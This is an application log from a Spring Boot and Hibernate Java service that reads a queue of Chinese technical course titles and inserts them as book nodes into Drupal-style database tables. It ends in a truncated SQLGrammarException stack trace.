2020-11-19 10:50:29.483 INFO  org.hibernate.jpa.internal.util.LogHelper Line:31  - HHH000204: Processing PersistenceUnitInfo [name: default]
2020-11-19 10:50:29.528 INFO  org.hibernate.Version Line:44  - HHH000412: Hibernate ORM core version 5.4.20.Final
2020-11-19 10:50:29.629 INFO  org.hibernate.annotations.common.Version Line:49  - HCANN000001: Hibernate Commons Annotations {5.1.0.Final}
2020-11-19 10:50:29.716 INFO  com.netflix.config.sources.URLConfigurationSource Line:122 - To enable URLs as dynamic configuration sources, define System property archaius.configurationSource.additionalUrls or make config.properties available on classpath.
2020-11-19 10:50:29.720 INFO  com.netflix.config.sources.URLConfigurationSource Line:122 - To enable URLs as dynamic configuration sources, define System property archaius.configurationSource.additionalUrls or make config.properties available on classpath.
2020-11-19 10:50:29.721 INFO  org.hibernate.dialect.Dialect Line:170 - HHH000400: Using dialect: org.hibernate.dialect.MySQL55Dialect
2020-11-19 10:50:30.319 INFO  org.hibernate.engine.transaction.jta.platform.internal.JtaPlatformInitiator Line:52  - HHH000490: Using JtaPlatform implementation: [org.hibernate.engine.transaction.jta.platform.internal.NoJtaPlatform]
2020-11-19 10:50:30.326 INFO  org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean Line:416 - Initialized JPA EntityManagerFactory for persistence unit 'default'
2020-11-19 10:50:31.152 INFO  org.springframework.cloud.commons.util.InetUtils Line:170 - Cannot determine local hostname
2020-11-19 10:50:31.221 INFO  org.apache.coyote.http11.Http11NioProtocol Line:173 - Starting ProtocolHandler ["http-nio-8080"]
2020-11-19 10:50:31.237 INFO  org.springframework.boot.web.embedded.tomcat.TomcatWebServer Line:220 - Tomcat started on port(s): 8080 (http) with context path ''
2020-11-19 10:50:32.335 INFO  org.springframework.cloud.commons.util.InetUtils Line:170 - Cannot determine local hostname
2020-11-19 10:50:32.336 INFO  org.springframework.data.repository.config.DeferredRepositoryInitializationListener Line:49  - Triggering deferred initialization of Spring Data repositories…
2020-11-19 10:50:32.755 INFO  org.springframework.data.repository.config.DeferredRepositoryInitializationListener Line:53  - Spring Data repositories initialized!
2020-11-19 10:50:32.761 INFO  geek.me.javaapi.JavaApiApplication Line:61  - Started JavaApiApplication in 7.471 seconds (JVM running for 8.325)
2020-11-19 10:50:33.263 INFO  org.apache.catalina.core.ContainerBase.[Tomcat].[localhost].[/] Line:173 - Initializing Spring DispatcherServlet 'dispatcherServlet'
2020-11-19 10:50:33.263 INFO  org.springframework.web.servlet.DispatcherServlet Line:525 - Initializing Servlet 'dispatcherServlet'
2020-11-19 10:50:33.268 INFO  org.springframework.web.servlet.DispatcherServlet Line:547 - Completed initialization in 5 ms
2020-11-19 10:50:43.175 INFO  jdbc.sqltiming Line:373 - select queueentit0_.item_id as item_id1_18_, queueentit0_.base_path as base_pat2_18_, queueentit0_.name 
as name3_18_, queueentit0_.todo as todo4_18_ from queue_new queueentit0_ where queueentit0_.todo=1 
 {executed in 1 msec}
2020-11-19 10:50:43.188 INFO  jdbc.resultsettable Line:610 - 
|-----------------|-------------------------------|--------------------|-----|
|item_id          |base_path                      |name                |todo |
|-----------------|-------------------------------|--------------------|-----|
|283828550600385  |00-资源文件/14-极客时间/01-专栏课/051-99/ |87-全栈工程师修炼指南        |1    |
|300655922831157  |00-资源文件/14-极客时间/01-专栏课/051-99/ |52-透视HTTP协议         |1    |
|390535478164697  |00-资源文件/14-极客时间/01-专栏课/051-99/ |51-白话法律42讲          |1    |
|409602706903658  |00-资源文件/14-极客时间/01-专栏课/051-99/ |77-从0打造音视频直播系统      |1    |
|459081746926346  |00-资源文件/14-极客时间/01-专栏课/051-99/ |99-JavaScript核心原理解析 |1    |
|476330106989327  |00-资源文件/14-极客时间/01-专栏课/051-99/ |88-高并发系统设计40问       |1    |
|621195835058382  |00-资源文件/14-极客时间/01-专栏课/051-99/ |97-项目管理实战20讲        |1    |
|626896109933850  |00-资源文件/14-极客时间/01-专栏课/051-99/ |98-设计模式之美           |1    |
|773737007105338  |00-资源文件/14-极客时间/01-专栏课/051-99/ |53-OpenResty从入门到实战  |1    |
|781941951179116  |00-资源文件/14-极客时间/01-专栏课/051-99/ |75-编辑训练营            |1    |
|787964344536295  |00-资源文件/14-极客时间/01-专栏课/051-99/ |80-网络编程实战           |1    |
|789557280998655  |00-资源文件/14-极客时间/01-专栏课/051-99/ |86-即时消息技术剖析与实战      |1    |
|823812106395779  |00-资源文件/14-极客时间/01-专栏课/051-99/ |74-Flutter核心技术与实战   |1    |
|855137735533744  |00-资源文件/14-极客时间/01-专栏课/051-99/ |94-DDD实战课           |1    |
|861073733380654  |00-资源文件/14-极客时间/01-专栏课/051-99/ |90-分布式技术原理与算法解析     |1    |
|876595205877896  |00-资源文件/14-极客时间/01-专栏课/051-99/ |91-说透中台             |1    |
|877479874575179  |00-资源文件/14-极客时间/01-专栏课/051-99/ |83-编译原理之美           |1    |
|936433950782588  |00-资源文件/14-极客时间/01-专栏课/051-99/ |95-苏杰的产品创新课         |1    |
|952316731239648  |00-资源文件/14-极客时间/01-专栏课/051-99/ |92-DevOps实战笔记       |1    |
|954967934009220  |00-资源文件/14-极客时间/01-专栏课/051-99/ |73-黄勇的OKR实战笔记       |1    |
|1004252009859251 |00-资源文件/14-极客时间/01-专栏课/051-99/ |85-研发效率破局之道         |1    |
|1009872364102685 |00-资源文件/14-极客时间/01-专栏课/051-99/ |81-浏览器工作原理与实践       |1    |
|1022101157981678 |00-资源文件/14-极客时间/01-专栏课/051-99/ |79-消息队列高手课          |1    |
|-----------------|-------------------------------|--------------------|-----|

2020-11-19 10:50:43.205 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_6_, bookfieldf0_.bundle as bundle2_6_, bookfieldf0_.delta 
as delta3_6_, bookfieldf0_.field_fsid_value as field_fs4_6_, bookfieldf0_.langcode as langcode5_6_, 
bookfieldf0_.revision_id as revision6_6_ from node__field_fsid bookfieldf0_ where bookfieldf0_.field_fsid_value='283828550600385' 
 {executed in 2 msec}
2020-11-19 10:50:43.206 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 10:50:43.228 INFO  jdbc.sqltiming Line:373 - insert into node_revision (langcode, nid, revision_default, revision_timestamp, revision_uid) 
values ('zh-hans', 0, 1, 1605754243, 1) 
 {executed in 2 msec}
2020-11-19 10:50:43.229 INFO  jdbc.sqltiming Line:373 - getGeneratedKeys on query: insert into node_revision (langcode, nid, revision_default, revision_timestamp, 
revision_uid) values ('zh-hans', 0, 1, 1605754243, 1) 
 {executed in 0 msec}
2020-11-19 10:50:43.230 INFO  jdbc.resultsettable Line:610 - 
|--------------|
|generated_key |
|--------------|
|1             |
|--------------|

2020-11-19 10:50:43.245 INFO  jdbc.sqltiming Line:373 - insert into node (langcode, type, uuid, vid) values ('zh-hans', 'book', '4bb8e624-5f97-4aae-b6e2-3b2e1b596579', 
1) 
 {executed in 2 msec}
2020-11-19 10:50:43.245 INFO  jdbc.sqltiming Line:373 - getGeneratedKeys on query: insert into node (langcode, type, uuid, vid) values ('zh-hans', 
'book', '4bb8e624-5f97-4aae-b6e2-3b2e1b596579', 1) 
 {executed in 0 msec}
2020-11-19 10:50:43.246 INFO  jdbc.resultsettable Line:610 - 
|--------------|
|generated_key |
|--------------|
|1             |
|--------------|

2020-11-19 10:50:43.255 INFO  jdbc.sqltiming Line:373 - update node_revision set langcode='zh-hans', nid=1, revision_default=1, revision_timestamp=1605754243, 
revision_uid=1 where vid=1 
 {executed in 0 msec}
2020-11-19 10:50:43.267 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_6_0_, bookfieldf0_.bundle as bundle2_6_0_, bookfieldf0_.delta 
as delta3_6_0_, bookfieldf0_.field_fsid_value as field_fs4_6_0_, bookfieldf0_.langcode as langcode5_6_0_, 
bookfieldf0_.revision_id as revision6_6_0_ from node__field_fsid bookfieldf0_ where bookfieldf0_.entity_id=1 
 {executed in 0 msec}
2020-11-19 10:50:43.268 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 10:50:43.271 INFO  jdbc.sqltiming Line:373 - insert into node__field_fsid (bundle, delta, field_fsid_value, langcode, revision_id, entity_id) 
values ('book', 0, '283828550600385', 'zh-hans', 1, 1) 
 {executed in 1 msec}
2020-11-19 10:50:43.279 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_15_0_, nodefieldf0_.bundle as bundle2_15_0_, nodefieldf0_.delta 
as delta3_15_0_, nodefieldf0_.field_fsid_value as field_fs4_15_0_, nodefieldf0_.langcode as 
langcode5_15_0_, nodefieldf0_.revision_id as revision6_15_0_ from node_revision__field_fsid 
nodefieldf0_ where nodefieldf0_.entity_id=1 
 {executed in 2 msec}
2020-11-19 10:50:43.279 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 10:50:43.281 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_fsid (bundle, delta, field_fsid_value, langcode, revision_id, 
entity_id) values ('book', 0, '283828550600385', 'zh-hans', 1, 1) 
 {executed in 0 msec}
2020-11-19 10:50:43.288 INFO  jdbc.sqltiming Line:373 - select bookentity0_.nid as nid1_1_, bookentity0_.bid as bid2_1_, bookentity0_.depth as depth3_1_, 
bookentity0_.has_children as has_chil4_1_, bookentity0_.p1 as p5_1_, bookentity0_.p2 as p6_1_, 
bookentity0_.p3 as p7_1_, bookentity0_.p4 as p8_1_, bookentity0_.p5 as p9_1_, bookentity0_.pid 
as pid10_1_, bookentity0_.weight as weight11_1_ from book bookentity0_ where bookentity0_.nid=1 
 {executed in 2 msec}
2020-11-19 10:50:43.289 INFO  jdbc.resultsettable Line:610 - 
|----|----|------|-------------|---|---|---|---|---|----|-------|
|nid |bid |depth |has_children |p1 |p2 |p3 |p4 |p5 |pid |weight |
|----|----|------|-------------|---|---|---|---|---|----|-------|
|----|----|------|-------------|---|---|---|---|---|----|-------|

2020-11-19 10:50:43.292 INFO  jdbc.sqltiming Line:373 - select bookentity0_.nid as nid1_1_0_, bookentity0_.bid as bid2_1_0_, bookentity0_.depth as 
depth3_1_0_, bookentity0_.has_children as has_chil4_1_0_, bookentity0_.p1 as p5_1_0_, bookentity0_.p2 
as p6_1_0_, bookentity0_.p3 as p7_1_0_, bookentity0_.p4 as p8_1_0_, bookentity0_.p5 as p9_1_0_, 
bookentity0_.pid as pid10_1_0_, bookentity0_.weight as weight11_1_0_ from book bookentity0_ 
where bookentity0_.nid=1 
 {executed in 0 msec}
2020-11-19 10:50:43.293 INFO  jdbc.resultsettable Line:610 - 
|----|----|------|-------------|---|---|---|---|---|----|-------|
|nid |bid |depth |has_children |p1 |p2 |p3 |p4 |p5 |pid |weight |
|----|----|------|-------------|---|---|---|---|---|----|-------|
|----|----|------|-------------|---|---|---|---|---|----|-------|

2020-11-19 10:50:43.296 INFO  jdbc.sqltiming Line:373 - insert into book (bid, depth, has_children, p1, p2, p3, p4, p5, pid, weight, nid) values (1, 
1, 1, 1, 0, 0, 0, 0, 0, 0, 1) 
 {executed in 1 msec}
2020-11-19 10:50:43.303 INFO  jdbc.sqltiming Line:373 - select nodebodyen0_.entity_id as entity_i1_3_, nodebodyen0_.body_value as body_val2_3_, nodebodyen0_.body_summary 
as body_sum3_3_, nodebodyen0_.bundle as bundle4_3_, nodebodyen0_.delta as delta5_3_, nodebodyen0_.body_format 
as body_for6_3_, nodebodyen0_.langcode as langcode7_3_, nodebodyen0_.revision_id as revision8_3_ 
from node__body nodebodyen0_ where nodebodyen0_.entity_id=1 
 {executed in 1 msec}
2020-11-19 10:50:43.303 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 10:50:43.308 INFO  jdbc.sqltiming Line:373 - select nodebodyre0_.entity_id as entity_i1_12_0_, nodebodyre0_.body_value as body_val2_12_0_, 
nodebodyre0_.body_summary as body_sum3_12_0_, nodebodyre0_.bundle as bundle4_12_0_, nodebodyre0_.delta 
as delta5_12_0_, nodebodyre0_.body_format as body_for6_12_0_, nodebodyre0_.langcode as langcode7_12_0_, 
nodebodyre0_.revision_id as revision8_12_0_ from node_revision__body nodebodyre0_ where nodebodyre0_.entity_id=1 
 {executed in 1 msec}
2020-11-19 10:50:43.309 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 10:50:43.312 INFO  jdbc.sqltiming Line:373 - insert into node_revision__body (body_value, body_summary, bundle, delta, body_format, langcode, 
revision_id, entity_id) values ('', '', 'book', 0, 'full_html', 'zh-hans', 1, 1) 
 {executed in 1 msec}
2020-11-19 10:50:43.318 INFO  jdbc.sqltiming Line:373 - select nodebodyen0_.entity_id as entity_i1_3_0_, nodebodyen0_.body_value as body_val2_3_0_, 
nodebodyen0_.body_summary as body_sum3_3_0_, nodebodyen0_.bundle as bundle4_3_0_, nodebodyen0_.delta 
as delta5_3_0_, nodebodyen0_.body_format as body_for6_3_0_, nodebodyen0_.langcode as langcode7_3_0_, 
nodebodyen0_.revision_id as revision8_3_0_ from node__body nodebodyen0_ where nodebodyen0_.entity_id=1 
 {executed in 0 msec}
2020-11-19 10:50:43.319 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 10:50:43.321 INFO  jdbc.sqltiming Line:373 - insert into node__body (body_value, body_summary, bundle, delta, body_format, langcode, revision_id, 
entity_id) values ('', '', 'book', 0, 'full_html', 'zh-hans', 1, 1) 
 {executed in 1 msec}
2020-11-19 10:50:43.329 INFO  jdbc.sqltiming Line:373 - select nodefiledd0_.nid as nid1_9_, nodefiledd0_.changed as changed2_9_, nodefiledd0_.created 
as created3_9_, nodefiledd0_.default_langcode as default_4_9_, nodefiledd0_.langcode as langcode5_9_, 
nodefiledd0_.promote as promote6_9_, nodefiledd0_.revision_translation_affected as revision7_9_, 
nodefiledd0_.status as status8_9_, nodefiledd0_.sticky as sticky9_9_, nodefiledd0_.title as 
title10_9_, nodefiledd0_.type as type11_9_, nodefiledd0_.uid as uid12_9_, nodefiledd0_.vid 
as vid13_9_ from node_field_data nodefiledd0_ where nodefiledd0_.nid=1 
 {executed in 1 msec}
2020-11-19 10:50:43.329 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |type |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|

2020-11-19 10:50:43.333 INFO  jdbc.sqltiming Line:373 - select nodefieldr0_.nid as nid1_10_0_, nodefieldr0_.changed as changed2_10_0_, nodefieldr0_.created 
as created3_10_0_, nodefieldr0_.default_langcode as default_4_10_0_, nodefieldr0_.langcode 
as langcode5_10_0_, nodefieldr0_.promote as promote6_10_0_, nodefieldr0_.revision_translation_affected 
as revision7_10_0_, nodefieldr0_.status as status8_10_0_, nodefieldr0_.sticky as sticky9_10_0_, 
nodefieldr0_.title as title10_10_0_, nodefieldr0_.uid as uid11_10_0_, nodefieldr0_.vid as vid12_10_0_ 
from node_field_revision nodefieldr0_ where nodefieldr0_.nid=1 
 {executed in 1 msec}
2020-11-19 10:50:43.334 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|

2020-11-19 10:50:43.336 INFO  jdbc.sqltiming Line:373 - insert into node_field_revision (changed, created, default_langcode, langcode, promote, revision_translation_affected, 
status, sticky, title, uid, vid, nid) values (1605754243, 1605754243, 1, 'zh-hans', 0, 1, 1, 
0, '87-全栈工程师修炼指南', 1, 1, 1) 
 {executed in 0 msec}
2020-11-19 10:50:43.343 INFO  jdbc.sqltiming Line:373 - select nodefiledd0_.nid as nid1_9_0_, nodefiledd0_.changed as changed2_9_0_, nodefiledd0_.created 
as created3_9_0_, nodefiledd0_.default_langcode as default_4_9_0_, nodefiledd0_.langcode as 
langcode5_9_0_, nodefiledd0_.promote as promote6_9_0_, nodefiledd0_.revision_translation_affected 
as revision7_9_0_, nodefiledd0_.status as status8_9_0_, nodefiledd0_.sticky as sticky9_9_0_, 
nodefiledd0_.title as title10_9_0_, nodefiledd0_.type as type11_9_0_, nodefiledd0_.uid as uid12_9_0_, 
nodefiledd0_.vid as vid13_9_0_ from node_field_data nodefiledd0_ where nodefiledd0_.nid=1 
 {executed in 0 msec}
2020-11-19 10:50:43.344 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |type |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|

2020-11-19 10:50:43.348 INFO  jdbc.sqltiming Line:373 - insert into node_field_data (changed, created, default_langcode, langcode, promote, revision_translation_affected, 
status, sticky, title, type, uid, vid, nid) values (1605754243, 1605754243, 1, 'zh-hans', 0, 
1, 1, 0, '87-全栈工程师修炼指南', 'book', 1, 1, 1) 
 {executed in 2 msec}
2020-11-19 10:50:43.355 INFO  jdbc.sqltiming Line:373 - select bookfieldm0_.entity_id as entity_i1_7_, bookfieldm0_.bundle as bundle2_7_, bookfieldm0_.delta 
as delta3_7_, bookfieldm0_.langcode as langcode4_7_, bookfieldm0_.field_media_value as field_me5_7_, 
bookfieldm0_.revision_id as revision6_7_ from node__field_media bookfieldm0_ where bookfieldm0_.entity_id=1 
 {executed in 2 msec}
2020-11-19 10:50:43.355 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 10:50:43.358 INFO  jdbc.sqltiming Line:373 - select bookfieldm0_.entity_id as entity_i1_7_0_, bookfieldm0_.bundle as bundle2_7_0_, bookfieldm0_.delta 
as delta3_7_0_, bookfieldm0_.langcode as langcode4_7_0_, bookfieldm0_.field_media_value as 
field_me5_7_0_, bookfieldm0_.revision_id as revision6_7_0_ from node__field_media bookfieldm0_ 
where bookfieldm0_.entity_id=1 
 {executed in 0 msec}
2020-11-19 10:50:43.359 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 10:50:43.362 INFO  jdbc.sqltiming Line:373 - insert into node__field_media (bundle, delta, langcode, field_media_value, revision_id, entity_id) 
values ('book', 0, 'zh-hans', '', 1, 1) 
 {executed in 1 msec}
2020-11-19 10:50:43.368 INFO  jdbc.sqltiming Line:373 - select nodefieldm0_.entity_id as entity_i1_16_0_, nodefieldm0_.bundle as bundle2_16_0_, nodefieldm0_.delta 
as delta3_16_0_, nodefieldm0_.langcode as langcode4_16_0_, nodefieldm0_.field_media_value as 
field_me5_16_0_, nodefieldm0_.revision_id as revision6_16_0_ from node_revision__field_media 
nodefieldm0_ where nodefieldm0_.entity_id=1 
 {executed in 1 msec}
2020-11-19 10:50:43.368 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 10:50:43.370 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_media (bundle, delta, langcode, field_media_value, revision_id, 
entity_id) values ('book', 0, 'zh-hans', '', 1, 1) 
 {executed in 1 msec}
2020-11-19 10:50:43.380 INFO  jdbc.sqltiming Line:373 - select bookfieldc0_.entity_id as entity_i1_4_, bookfieldc0_.bundle as bundle2_4_, bookfieldc0_.field_comment_value 
as field_co3_4_, bookfieldc0_.delta as delta4_4_, bookfieldc0_.field_comment_format as field_co5_4_, 
bookfieldc0_.langcode as langcode6_4_, bookfieldc0_.revision_id as revision7_4_ from node__field_comment 
bookfieldc0_ where bookfieldc0_.entity_id=1 
 {executed in 2 msec}
2020-11-19 10:50:43.380 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 10:50:43.387 INFO  jdbc.sqltiming Line:373 - select bookfieldc0_.entity_id as entity_i1_4_0_, bookfieldc0_.bundle as bundle2_4_0_, bookfieldc0_.field_comment_value 
as field_co3_4_0_, bookfieldc0_.delta as delta4_4_0_, bookfieldc0_.field_comment_format as 
field_co5_4_0_, bookfieldc0_.langcode as langcode6_4_0_, bookfieldc0_.revision_id as revision7_4_0_ 
from node__field_comment bookfieldc0_ where bookfieldc0_.entity_id=1 
 {executed in 3 msec}
2020-11-19 10:50:43.388 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 10:50:43.392 INFO  jdbc.sqltiming Line:373 - insert into node__field_comment (bundle, field_comment_value, delta, field_comment_format, 
langcode, revision_id, entity_id) values ('book', '', 0, 'full_html', 'zh-hans', 1, 1) 
 {executed in 2 msec}
2020-11-19 10:50:43.401 INFO  jdbc.sqltiming Line:373 - select nodefieldc0_.entity_id as entity_i1_13_0_, nodefieldc0_.bundle as bundle2_13_0_, nodefieldc0_.field_comment_value 
as field_co3_13_0_, nodefieldc0_.delta as delta4_13_0_, nodefieldc0_.field_comment_format as 
field_co5_13_0_, nodefieldc0_.langcode as langcode6_13_0_, nodefieldc0_.revision_id as revision7_13_0_ 
from node_revision__field_comment nodefieldc0_ where nodefieldc0_.entity_id=1 
 {executed in 0 msec}
2020-11-19 10:50:43.402 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 10:50:43.406 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_comment (bundle, field_comment_value, delta, field_comment_format, 
langcode, revision_id, entity_id) values ('book', '', 0, 'full_html', 'zh-hans', 1, 1) 
 {executed in 2 msec}
2020-11-19 10:50:43.414 INFO  jdbc.sqltiming Line:373 - select bookfieldt0_.entity_id as entity_i1_8_, bookfieldt0_.bundle as bundle2_8_, bookfieldt0_.delta 
as delta3_8_, bookfieldt0_.langcode as langcode4_8_, bookfieldt0_.revision_id as revision5_8_, 
bookfieldt0_.field_thumb_value as field_th6_8_ from node__field_thumb bookfieldt0_ where bookfieldt0_.entity_id=1 
 {executed in 2 msec}
2020-11-19 10:50:43.414 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 10:50:43.418 INFO  jdbc.sqltiming Line:373 - select bookfieldt0_.entity_id as entity_i1_8_0_, bookfieldt0_.bundle as bundle2_8_0_, bookfieldt0_.delta 
as delta3_8_0_, bookfieldt0_.langcode as langcode4_8_0_, bookfieldt0_.revision_id as revision5_8_0_, 
bookfieldt0_.field_thumb_value as field_th6_8_0_ from node__field_thumb bookfieldt0_ where 
bookfieldt0_.entity_id=1 
 {executed in 0 msec}
2020-11-19 10:50:43.419 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 10:50:43.422 INFO  jdbc.sqltiming Line:373 - insert into node__field_thumb (bundle, delta, langcode, revision_id, field_thumb_value, entity_id) 
values ('book', 0, 'zh-hans', 1, '', 1) 
 {executed in 2 msec}
2020-11-19 10:50:43.434 INFO  jdbc.sqltiming Line:373 - select nodefieldt0_.entity_id as entity_i1_17_0_, nodefieldt0_.bundle as bundle2_17_0_, nodefieldt0_.delta 
as delta3_17_0_, nodefieldt0_.langcode as langcode4_17_0_, nodefieldt0_.revision_id as revision5_17_0_, 
nodefieldt0_.field_thumb_value as field_th6_17_0_ from node_revision__field_thumb nodefieldt0_ 
where nodefieldt0_.entity_id=1 
 {executed in 2 msec}
2020-11-19 10:50:43.435 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 10:50:43.437 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_thumb (bundle, delta, langcode, revision_id, field_thumb_value, 
entity_id) values ('book', 0, 'zh-hans', 1, '', 1) 
 {executed in 1 msec}
2020-11-19 10:50:43.463 INFO  org.hibernate.event.internal.DefaultLoadEventListener Line:116 - HHH000327: Error performing load command
org.hibernate.exception.SQLGrammarException: could not extract ResultSet
	at org.hibernate.exception.internal.SQLExceptionTypeDelegate.convert(SQLExceptionTypeDelegate.java:63)
	at org.hibernate.exception.internal.StandardSQLExceptionConverter.convert(StandardSQLExceptionConverter.java:42)
	at org.hibernate.engine.jdbc.spi.SqlExceptionHelper.convert(SqlExceptionHelper.java:113)
	at org.hibernate.engine.jdbc.spi.SqlExceptionHelper.convert(SqlExceptionHelper.java:99)
	at org.hibernate.engine.jdbc.internal.ResultSetReturnImpl.extract(ResultSetReturnImpl.java:67)
	at org.hibernate.loader.Loader.getResultSet(Loader.java:2341)
	at org.hibernate.loader.Loader.executeQueryStatement(Loader.java:2094)
	at org.hibernate.loader.Loader.executeQueryStatement(Loader.java:2056)
	at org.hibernate.loader.Loader.doQuery(Loader.java:953)
	at org.hibernate.loader.Loader.doQueryAndInitializeNonLazyCollections(Loader.java:350)
	at org.hibernate.loader.Loader.doQueryAndInitializeNonLazyCollections(Loader.java:320)
	at org.hibernate.loader.Loader.loadEntity(Loader.java:2459)
	at org.hibernate.loader.entity.AbstractEntityLoader.load(AbstractEntityLoader.java:74)
	at org.hibernate.loader.entity.AbstractEntityLoader.load(AbstractEntityLoader.java:63)
	at org.hibernate.persister.entity.AbstractEntityPersister.doLoad(AbstractEntityPersister.java:4418)
	at org.hibernate.persister.entity.AbstractEntityPersister.load(AbstractEntityPersister.java:4408)
	at org.hibernate.event.internal.DefaultLoadEventListener.loadFromDatasource(DefaultLoadEventListener.java:569)
	at org.hibernate.event.internal.DefaultLoadEventListener.doLoad(DefaultLoadEventListener.java:537)
	at org.hibernate.event.internal.DefaultLoadEventListener.load(DefaultLoadEventListener.java:208)
	at org.hibernate.event.internal.DefaultLoadEventListener.proxyOrLoad(DefaultLoadEventListener.java:332)
	at org.hibernate.event.internal.DefaultLoadEventListener.doOnLoad(DefaultLoadEventListener.java:108)
	at org.hibernate.event.internal.DefaultLoadEventListener.onLoad(DefaultLoadEventListener.java:74)
	at org.hibernate.internal.SessionImpl$$Lambda$869/464352981.applyEventToListener(Unknown Source)
	at org.hibernate.event.service.internal.EventListenerGroupImpl.fireEventOnEachListener(EventListenerGroupImpl.java:113)
	at org.hibernate.internal.SessionImpl.fireLoadNoChecks(SessionImpl.java:1187)
	at org.hibernate.internal.SessionImpl.fireLoad(SessionImpl.java:1176)
	at org.hibernate.internal.SessionImpl.access$2100(SessionImpl.java:194)
	at org.hibernate.internal.SessionImpl$IdentifierLoadAccessImpl.doLoad(SessionImpl.java:2787)
	at org.hibernate.internal.SessionImpl$IdentifierLoadAccessImpl.lambda$load$1(SessionImpl.java:2768)
	at org.hibernate.internal.SessionImpl$IdentifierLoadAccessImpl$$Lambda$868/642296388.get(Unknown Source)
	at org.hibernate.internal.SessionImpl$IdentifierLoadAccessImpl.perform(SessionImpl.java:2724)
	at org.hibernate.internal.SessionImpl$IdentifierLoadAccessImpl.load(SessionImpl.java:2768)
	at org.hibernate.internal.SessionImpl.get(SessionImpl.java:989)
